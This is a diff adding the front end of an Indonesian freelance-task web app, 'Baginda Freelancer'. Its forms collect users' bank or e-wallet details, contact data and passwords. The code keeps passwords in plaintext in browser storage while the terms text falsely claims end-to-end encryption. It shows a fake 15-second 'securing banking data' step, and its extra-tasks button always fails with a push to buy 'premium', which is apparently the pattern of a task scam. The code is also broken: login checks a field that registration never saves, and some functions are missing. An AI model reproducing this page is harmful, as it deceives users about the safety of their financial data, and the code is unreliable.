+            
+        </div>
+
+        <div id="riwayat" class="container" style="display:none; padding:20px;">
+            <h3 style="margin-bottom:20px; font-weight:800;">Riwayat Aktivitas</h3>
+            <div style="display:flex; gap:12px; margin-bottom:20px;">
+                <button id="tab-tugas" class="btn-3d btn-blue-3d" style="flex:1; font-size:0.75rem;" onclick="toggleRiwayat('tugas')">Riwayat Tugas</button>
+                <button id="tab-trans" class="btn-3d btn-gray-3d" style="flex:1; font-size:0.75rem;" onclick="toggleRiwayat('transaksi')">Riwayat Transaksi</button>
+            </div>
+            <div id="box-tugas" style="background:white; padding:50px 20px; border-radius:30px; text-align:center; border:1px solid #f1f5f9;">
+                <i class="fas fa-tasks" style="font-size:3rem; color:#f1f5f9; margin-bottom:15px;"></i>
+                <p style="color:#94a3b8; font-size:0.9rem;">Belum ada tugas yang diselesaikan.</p>
+            </div>
+            <div id="box-trans" style="background:white; padding:50px 20px; border-radius:30px; text-align:center; border:1px solid #f1f5f9; display:none;">
+                <i class="fas fa-exchange-alt" style="font-size:3rem; color:#f1f5f9; margin-bottom:15px;"></i>
+                <p style="color:#94a3b8; font-size:0.9rem;">Belum ada riwayat transaksi.</p>
+            </div>
+        </div>
+
+        <div id="profil" class="container" style="display:none; padding:20px;">
+            <h3 style="margin-bottom:20px; font-weight:800;">Profil Saya</h3>
+            <div style="background:white; border-radius:35px; padding:25px; margin-bottom:20px; box-shadow:0 10px 25px rgba(0,0,0,0.03);">
+                <div class="data-row"><span class="data-label">User ID</span><span class="data-value" id="p-id">-</span></div>
+                <div class="data-row"><span class="data-label">WhatsApp</span><span class="data-value" id="p-wa">-</span></div>
+                <div class="data-row"><span class="data-label">Email</span><span class="data-value" id="p-email">-</span></div>
+                <div class="data-row"><span class="data-label">Bank/E-Wallet</span><span class="data-value" id="p-bank">-</span></div>
+                <div class="data-row"><span class="data-label">Atas Nama</span><span class="data-value" id="p-rekname">-</span></div>
+                <div class="data-row" style="border:none;"><span class="data-label">Nomor Rekening</span><span class="data-value" id="p-rekno">-</span></div>
+            </div>
+
+            <button class="btn-3d btn-blue-3d" style="width:100%; margin-bottom:15px;" onclick="openForm('change-pass')"><i class="fas fa-shield-alt"></i> Ubah Kata Sandi</button>
+            <button class="btn-3d btn-blue-3d" style="width:100%; margin-bottom:15px; background:var(--success); box-shadow:0 6px 0 #059669;" onclick="openForm('help-center')"><i class="fas fa-headset"></i> Pusat Bantuan</button>
+            <button class="btn-3d btn-red-3d" style="width:100%;" onclick="openForm('confirm-logout')">Log Out Akun</button>
+
+            <div style="margin-top:30px; text-align:center;">
+                <p style="font-size:0.8rem; color:var(--accent); font-weight:800; cursor:pointer;" onclick="openForm('modal-legal-new')">Syarat & Ketentuan | Kebijakan Privasi</p>
+                <p style="font-size:0.75rem; color:#94a3b8; margin-top:10px; font-weight:600;">&copy; 2026 Baginda Freelancer Official</p>
+            </div>
+        </div>
+
+        <nav class="bottom-nav">
+            <div class="nav-item active" onclick="switchNav('beranda', this)"><i class="fas fa-home"></i>Beranda</div>
+            <div class="nav-item" onclick="switchNav('riwayat', this)"><i class="fas fa-history"></i>Riwayat</div>
+            <div class="nav-item" onclick="switchNav('profil', this)"><i class="fas fa-user-circle"></i>Akun Saya</div>
+        </nav>
+    </div>
+
+    <div id="modal-register" class="form-overlay">
+        <div class="card">
+            <span class="close-form" onclick="closeAllForms()">&times;</span>
+            <h3 style="margin-bottom:20px; color:var(--primary);">Pendaftaran Akun</h3>
+            <form id="regForm">
+                <div class="form-group"><label>User ID</label><input type="text" id="r_user" required></div>
+                <div class="form-group"><label>WhatsApp</label><input type="number" id="r_wa" required></div>
+                <div class="form-group"><label>Email Aktif</label><input type="email" id="r_email" required></div>
+                <div class="form-group"><label>Password (Min 6)</label>
+                    <input type="password" id="r_pass" minlength="6" required><i class="fas fa-eye eye-icon" onclick="togglePass('r_pass')"></i>
+                </div>
+                <div class="form-group"><label>Konfirmasi Password</label>
+                    <input type="password" id="r_conf" minlength="6" required><i class="fas fa-eye eye-icon" onclick="togglePass('r_conf')"></i>
+                </div>
+                <div class="form-group">
+                    <label>Pilih Bank / E-Wallet</label>
+                    <select id="r_bank" required>
+                        <option value="">-- Pilih Metode --</option>
+                        <optgroup label="E-Wallet">
+                            <option>DANA</option><option>OVO</option><option>GoPay</option><option>LinkAja</option><option>ShopeePay</option>
+                        </optgroup>
+                        <optgroup label="Bank Pemerintah">
+                            <option>Bank BRI</option><option>Bank BNI</option><option>Bank Mandiri</option><option>Bank BTN</option>
+                        </optgroup>
+                        <optgroup label="Bank Swasta">
+                            <option>Bank BCA</option><option>Bank CIMB Niaga</option><option>Bank Danamon</option><option>Bank OCBC NISP</option><option>Bank Mega</option><option>Bank Permata</option>
+                        </optgroup>
+                        <optgroup label="Bank Digital">
+                            <option>Bank Jago</option><option>SeaBank</option><option>Neo Bank</option><option>Allo Bank</option>
+                        </optgroup>
+                    </select>
+                </div>
+                <div class="form-group"><label>Nama Sesuai Rekening</label><input type="text" id="r_rekname" required></div>
+                <div class="form-group">
+                    <label>Nomor Rekening</label>
+                    <input type="number" id="r_rekno" required>
+                </div>
+                
+                <div style="margin-top: 20px; display: flex; flex-direction: column; gap: 10px;">
+                    <button type="button" class="btn-3d btn-blue-3d" onclick="doRegister()" style="width: 100%;">DAFTAR SEKARANG</button>
+                    <button type="button" class="btn-3d btn-gray-3d" onclick="closeAllForms()" style="width: 100% !important;">BATAL</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="modal-login" class="form-overlay">
+        <div class="card">
+            <span class="close-form" onclick="closeAllForms()">&times;</span>
+            <h3 style="margin-bottom:25px;">Masuk Aplikasi</h3>
+            <form id="logForm">
+                <div class="form-group"><label>User ID</label><input type="text" id="l_user" required></div>
+                <div class="form-group"><label>Password</label>
+                    <input type="password" id="l_pass" required><i class="fas fa-eye eye-icon" onclick="togglePass('l_pass')"></i>
+                </div>
+                <p style="text-align:right; font-size:0.8rem; color:var(--accent); cursor:pointer; margin-bottom:15px; font-weight:700;" onclick="openForm('forgot-pass')">Lupa Password?</p>
+                <button type="submit" class="btn-3d btn-blue-3d" style="width:100%;">Masuk Verifikasi</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="modal-forgot-pass" class="form-overlay">
+        <div class="card">
+            <span class="close-form" onclick="closeAllForms()">&times;</span>
+            <h3 style="margin-bottom:20px;">Pemulihan Akun</h3>
+            <form id="forgotForm">
+                <div class="form-group"><label>User ID</label><input type="text" id="f_user" required></div>
+                <div class="form-group"><label>Email Terdaftar</label><input type="email" id="f_email" required></div>
+                <div class="form-group"><label>Sandi Baru</label>
+                    <input type="password" id="f_new" minlength="6" required><i class="fas fa-eye eye-icon" onclick="togglePass('f_new')"></i>
+                </div>
+                <div class="form-group"><label>Konfirmasi Sandi Baru</label>
+                    <input type="password" id="f_conf" minlength="6" required><i class="fas fa-eye eye-icon" onclick="togglePass('f_conf')"></i>
+                </div>
+                <button type="submit" class="btn-3d btn-blue-3d" style="width:100%;">Atur Ulang Sandi</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="modal-change-pass" class="form-overlay">
+        <div class="card">
+            <span class="close-form" onclick="closeAllForms()">&times;</span>
+            <h3 style="margin-bottom:20px;">Ubah Kata Sandi</h3>
+            <form id="changeForm">
+                <div class="form-group"><label>Sandi Lama</label>
+                    <input type="password" id="c_old" required><i class="fas fa-eye eye-icon" onclick="togglePass('c_old')"></i>
+                </div>
+                <div class="form-group"><label>Sandi Baru</label>
+                    <input type="password" id="c_new" minlength="6" required><i class="fas fa-eye eye-icon" onclick="togglePass('c_new')"></i>
+                </div>
+                <div class="form-group"><label>Konfirmasi Sandi Baru</label>
+                    <input type="password" id="c_conf" minlength="6" required><i class="fas fa-eye eye-icon" onclick="togglePass('c_conf')"></i>
+                </div>
+                <button type="submit" class="btn-3d btn-blue-3d" style="width:100%;">Simpan Perubahan</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="modal-help-center" class="form-overlay">
+        <div class="card" style="text-align:center;">
+            <span class="close-form" onclick="closeAllForms()">&times;</span>
+            <i class="fas fa-headset" style="font-size:3.5rem; color:var(--primary); margin-bottom:20px;"></i>
+            <h3 style="margin-bottom:15px;">Hubungi Admin</h3>
+            <p style="font-size:0.9rem; color:var(--text-muted); margin-bottom:25px;">Pilih layanan bantuan untuk berbicara dengan admin kami.</p>
+            <div style="display:flex; flex-direction:column; gap:12px;">
+                <button class="btn-3d btn-blue-3d" style="background:#25d366; box-shadow:0 6px 0 #128c7e;" onclick="window.open('https://wa.me/6283879611576')"><i class="fab fa-whatsapp"></i> WhatsApp Admin</button>
+                <button class="btn-3d btn-blue-3d" onclick="window.location.href='mailto:support@bagindafreelancer.com'"><i class="fas fa-envelope"></i> Layanan Email</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-confirm-logout" class="form-overlay">
+        <div class="card" style="text-align:center;">
+            <i class="fas fa-sign-out-alt" style="font-size:3.5rem; color:var(--danger); margin-bottom:20px;"></i>
+            <h3 style="margin-bottom:15px;">Konfirmasi Logout</h3>
+            <p style="font-size:0.9rem; color:var(--text-muted); margin-bottom:25px;">Apakah Anda yakin ingin keluar dari sesi ini?</p>
+            <div style="display:flex; gap:15px;">
+                <button class="btn-3d btn-gray-3d" style="flex:1;" onclick="closeAllForms()">Batal</button>
+                <button class="btn-3d btn-red-3d" style="flex:1;" onclick="doLogout()">Ya, Keluar</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-modal-legal-new" class="form-overlay">
+        <div class="card">
+            <span class="close-form" onclick="closeAllForms()">&times;</span>
+            <h3 style="margin-bottom:20px; color:var(--primary);">Syarat & Kebijakan</h3>
+            <div class="legal-content-box" style="height:350px;">
+                <p><b>A. Kebijakan Akun:</b> Sistem keamanan kami mendeteksi duplikasi data secara otomatis. Satu perangkat dan satu identitas perbankan hanya diperbolehkan untuk satu akun.</p><br>
+                <p><b>B. Proses Penarikan:</b> Penarikan dana diproses secara real-time setelah pengajuan resmi dilakukan melalui sistem.</p><br>
+                <p><b>C. Privasi Pengguna:</b> Seluruh data terenkripsi end-to-end menggunakan protokol keamanan terbaru 2026.</p>
+            </div>
+            <button class="btn-3d btn-blue-3d" style="width:100%; margin-top:20px;" onclick="closeAllForms()">Saya Mengerti</button>
+        </div>
+    </div>
+
+    <div id="modal-status">
+        <div class="status-box">
+            <div id="st-loader" class="loader"></div>
+            <div id="st-success" class="status-icon success-v"><i class="fas fa-check-circle"></i></div>
+            <div id="st-error" class="status-icon error-x"><i class="fas fa-times-circle"></i></div>
+            <h3 id="st-title" style="margin-bottom:12px; color:#1e293b;">Memproses...</h3>
+            <p id="st-msg" style="font-size:0.95rem; color:#64748b; margin-bottom:25px;"></p>
+            <button id="st-btn" class="btn-3d btn-blue-3d" style="width:100%; display:none;" onclick="closeStatus()">Selesai</button>
+        </div>
+    </div>
+
+    <script>
+        // PERSISTENT LOGIN ENGINE (VERSI PERBAIKAN)
+        window.onload = function() {
+            const isLogged = localStorage.getItem('bf_isLogged');
+            const currentUserId = localStorage.getItem('bf_currentUser');
+            
+            if(isLogged === 'true' && currentUserId) {
+                // Cari data lengkap user tersebut di database
+                const usersList = JSON.parse(localStorage.getItem('bf_usersDatabase')) || [];
+                const userData = usersList.find(u => u.user === currentUserId);
+                
+                if(userData) {
+                    loadDashboard(userData);
+                } else {
+                    // Jika data tidak ketemu, paksa ke landing page
+                    document.getElementById('landing-page').style.display = 'block';
+                }
+            } else {
+                // Jika belum login, tampilkan landing page
+                document.getElementById('landing-page').style.display = 'block';
+            }
+            
+            // Jalankan animasi teks Laura
+            if(typeof runLauraText === "function") runLauraText();
+        };
+
+        const messages = ["•", "•", "•"];
+        let msgIdx = 0;
+        function runLauraText() {
+            setInterval(() => {
+                const el = document.getElementById('laura-text');
+                if(el) {
+                    el.style.opacity = 0;
+                    setTimeout(() => {
+                        el.innerText = messages[msgIdx];
+                        el.style.opacity = 1;
+                        msgIdx = (msgIdx + 1) % messages.length;
+                    }, 500);
+                }
+            }, 3000);
+        }
+
+        function startApp() { document.getElementById('laura-overlay').style.display = 'none'; }
+        function scrollToLegal() { document.getElementById('legal-section').scrollIntoView({behavior:'smooth'}); }
+        function openForm(id) { closeAllForms(); document.getElementById('modal-'+id).style.display = 'flex'; }
+        function closeAllForms() { document.querySelectorAll('.form-overlay').forEach(m => m.style.display = 'none'); }
+        function togglePass(id) { const x = document.getElementById(id); x.type = x.type === 'password' ? 'text' : 'password'; }
+        
+        function switchNav(id, el) {
+            document.querySelectorAll('.container').forEach(c => c.style.display = 'none');
+            document.getElementById(id).style.display = 'block';
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            el.classList.add('active');
+        }
+
+        function toggleRiwayat(type) {
+            document.getElementById('box-tugas').style.display = type === 'tugas' ? 'block' : 'none';
+            document.getElementById('box-trans').style.display = type === 'transaksi' ? 'block' : 'none';
+            document.getElementById('tab-tugas').className = type === 'tugas' ? 'btn-3d btn-blue-3d' : 'btn-3d btn-gray-3d';
+            document.getElementById('tab-trans').className = type === 'transaksi' ? 'btn-3d btn-blue-3d' : 'btn-3d btn-gray-3d';
+        }
+
+        // CUSTOM NOTIFICATION ENGINE
+        function triggerStatus(type, title, msg, callback = null) {
+            const m = document.getElementById('modal-status');
+            const l = document.getElementById('st-loader');
+            const s = document.getElementById('st-success');
+            const e = document.getElementById('st-error');
+            const b = document.getElementById('st-btn');
+
+            m.style.display = 'flex';
+            l.style.display = type === 'loading' ? 'block' : 'none';
+            s.style.display = type === 'success' ? 'block' : 'none';
+            e.style.display = type === 'error' ? 'block' : 'none';
+            b.style.display = type === 'loading' ? 'none' : 'block';
+            
+            document.getElementById('st-title').innerText = title;
+            document.getElementById('st-msg').innerText = msg;
+
+            if(callback) b.onclick = () => { m.style.display = 'none'; callback(); };
+            else b.onclick = () => m.style.display = 'none';
+        }
+
+        function closeStatus() { document.getElementById('modal-status').style.display = 'none'; }
+
+        // REGISTRATION ENGINE (PERBAIKAN TOTAL)
+    function doRegister() {
+        const pass = document.getElementById('r_pass').value;
+        const conf = document.getElementById('r_conf').value;
+        const user = document.getElementById('r_user').value;
+        const rekno = document.getElementById('r_rekno').value;
+    const wa = document.getElementById('r_wa').value;
+    const email = document.getElementById('r_email').value;
+    const bank = document.getElementById('r_bank').value;
+    
+        if(!user || !rekno || !pass) {
+            triggerStatus('error', 'Gagal', 'Mohon lengkapi data User ID, Nomor Rekening, dan Password.');
+            return;
+        }
+
+        if(pass !== conf) {
+            triggerStatus('error', 'Gagal', 'Konfirmasi password tidak cocok.');
+            return;
+        }
+
+        const newUser = {
+            user: user,
+            wa: wa,
+            email: email,
+            bank: bank,
+            rekno: rekno,
+            password: pass,
+            // Tambahan wadah data agar saldo & riwayat tersimpan permanen
+            saldo: 0,
+            tasksSelesai: [],
+            riwayatAktivitas: []
+        };
+            // Cek data duplikat [cite: 2026-02-01]
+            let usersList = JSON.parse(localStorage.getItem('bf_usersDatabase')) || [];
+            // CEK USERNAME DUPLIKAT
+if (usersList.some(u => u.user === user)) {
+    triggerStatus(
+        'error',
+        'Gagal',
+        'User ID sudah terdaftar. Silakan gunakan User ID lain.'
+    );
+    return;
+}
+
+
+        const isDuplicate = usersList.find(u => u.email === newUser.email || u.wa === newUser.wa || u.rekno === newUser.rekno || u.user === newUser.user);
+        
+        if(isDuplicate) {
+            triggerStatus('error', 'Data Duplikat', 'User ID, Email, WA, atau Rekening sudah terdaftar.');
+            return;
+        }
+        // LANGKAH 4 — SIMPAN USER KE DATABASE
+usersList.push(newUser);
+
+localStorage.setItem(
+  'bf_usersDatabase',
+  JSON.stringify(usersList)
+);
+
+            triggerStatus('loading', 'Mendaftarkan...', 'Mengamankan data keamanan perbankan (15 detik)...');
+
+    setTimeout(() => {
+         // Menandai siapa yang sedang login        
+        triggerStatus('success', 'Berhasil ✓', 'Akun terdaftar! Membuka Dashboard...', () => {
+            // 1. Proses otomatis login
+            // Menggunakan kunci yang sama agar sinkron dengan window.onload
+localStorage.setItem('bf_isLogged', 'true');
+localStorage.setItem('bf_currentUser', newUser.user);
+            
+            // 2. Tutup SEMUA modal dan status loading (Menghilangkan layar putih)
+            closeAllForms();
+            if(typeof closeStatus === "function") {
+                closeStatus();
+            }
+            loadDashboard(newUser);
+            // 3. Pindah tampilan ke Dashboard
+            const landing = document.getElementById('landing-page');
+            const dashboard = document.getElementById('dashboard-page');
+            
+            if(landing) landing.style.display = 'none';
+            if(dashboard) dashboard.style.display = 'block';
+            
+            // 4. Update profil dashboard
+            if(typeof checkLoginStatus === "function") {
+                checkLoginStatus();
+            }
+        });
+    }, 15000);
+}
+        // LOGIN ENGINE
+        // LOGIN ENGINE (VERSI MULTI-AKUN)
+        document.getElementById('logForm').onsubmit = function(e) {
+            e.preventDefault();
+            const usersList = JSON.parse(localStorage.getItem('bf_usersDatabase')) || [];
+            const uInput = document.getElementById('l_user').value;
+            const pInput = document.getElementById('l_pass').value;
+
+            const userFound = usersList.find(u => u.user === uInput && u.pass === pInput);
+
+            if(userFound) {
+                triggerStatus('loading', 'Verifikasi...', 'Memeriksa kredensial akses...');
+                setTimeout(() => {
+                    localStorage.setItem('bf_isLogged', 'true');
+                    localStorage.setItem('bf_currentUser', userFound.user);
+                    triggerStatus('success', 'Berhasil ✓', 'Selamat Datang Kembali!', () => loadDashboard(userFound));
+                }, 2000);
+            } else {
+                triggerStatus('error', 'Gagal', 'User ID atau Password salah.');
+            }
+        };
+
+        // FORGOT PASSWORD ENGINE (SINKRON DATABASE)
+        document.getElementById('forgotForm').onsubmit = function(e) {
+            e.preventDefault();
+            let usersList = JSON.parse(localStorage.getItem('bf_usersDatabase')) || [];
+            const userIdx = usersList.findIndex(u => u.user === document.getElementById('f_user').value && u.email === document.getElementById('f_email').value);
+            
+            if(userIdx !== -1) {
+                if(document.getElementById('f_new').value !== document.getElementById('f_conf').value) {
+                    triggerStatus('error', 'Eror', 'Konfirmasi sandi tidak cocok.'); return;
+                }
+                usersList[userIdx].pass = document.getElementById('f_new').value;
+                localStorage.setItem('bf_usersDatabase', JSON.stringify(usersList));
+                triggerStatus('success', 'Berhasil ✓', 'Kata sandi telah diperbarui.', () => closeAllForms());
+            } else {
+                triggerStatus('error', 'Gagal', 'Data verifikasi tidak ditemukan.');
+            }
+        };
+
+        // CHANGE PASSWORD ENGINE (SINKRON DATABASE)
+        document.getElementById('changeForm').onsubmit = function(e) {
+            e.preventDefault();
+            const activeUser = getActiveUser();
+            if(document.getElementById('c_old').value !== activeUser.pass) {
+                triggerStatus('error', 'Gagal', 'Sandi lama salah.'); return;
+            }
+            if(document.getElementById('c_new').value !== document.getElementById('c_conf').value) {
+                triggerStatus('error', 'Gagal', 'Konfirmasi sandi baru tidak cocok.'); return;
+            }
+            activeUser.pass = document.getElementById('c_new').value;
+            saveActiveUser(activeUser);
+            triggerStatus('success', 'Tersimpan ✓', 'Kata sandi berhasil diubah.', () => closeAllForms());
+        };
+
+        function loadDashboard(u) {
+            localStorage.setItem('bf_isLogged', 'true');
+            localStorage.setItem('bf_currentUser', u.user); 
+            closeAllForms();
+            
+            document.getElementById('landing-page').style.display = 'none';
+            document.getElementById('dashboard-page').style.display = 'block';
+
+            // 1. Update Tampilan Kartu Wallet
+            document.getElementById('d-id-display').innerText = "ID: BF-" + u.user.toUpperCase();
+            document.getElementById('d-balance').innerText = "Rp " + Number(u.saldo).toLocaleString('id-ID');
+            document.getElementById('d-bankname').innerText = u.bank.toUpperCase();
+            document.getElementById('d-norek').innerText = u.rekno.substring(0, 6) + " **** " + u.rekno.slice(-2);
+
+            // 2. Update Tampilan Data Profil
+            document.getElementById('p-id').innerText = u.user;
+            document.getElementById('p-wa').innerText = u.wa;
+            document.getElementById('p-email').innerText = u.email;
+            document.getElementById('p-bank').innerText = u.bank;
+            document.getElementById('p-rekname').innerText = u.rekname;
+            document.getElementById('p-rekno').innerText = u.rekno.substring(0, 8) + "*****";
+
+            // 3. AKTIFKAN MESIN (Sangat Penting agar tugas & saldo muncul)
+            updateSaldoDisplay();    
+            renderTugas();           
+            tampilkanRiwayatKeLayar();
+        }
+function telusuriTugasLain() {
+            // Tampilkan loading selama 3 detik
+            triggerStatus('loading', 'Mencari Tugas...', 'Sedang mencari tugas tambahan untukmu...');
+            
+            setTimeout(() => {
+                // Setelah 3 detik, ubah jadi pesan error
+                triggerStatus('error', 'Akses Terbatas', 'Ups! sepertinya akun kamu belum premium, yuk aktifkan akun mu untuk menjelajahi ratusan tugas setiap hari');
+            }, 3000);
+        }
+        function doLogout() {
+    // Menghapus status login
+    localStorage.removeItem('bf_isLogged');
+    // Menghapus ID user yang sedang aktif
+    localStorage.removeItem('bf_currentUser');
+    
+    // Memaksa halaman muat ulang dari awal agar memori browser bersih total
+    location.replace(window.location.href); 
+}
+        
+    </script>
+    
+    <script>
+document.addEventListener("DOMContentLoaded", function () {
+    const username = localStorage.getItem('bf_currentUser');
+    const users = JSON.parse(localStorage.getItem('bf_users')) || [];
+
+    if (username) {
+        const user = users.find(u => u.user === username);
+        if (user) {
+            loadDashboard(user);
+        }
+    }
+});
+</script>
+
+</body>
+</html>
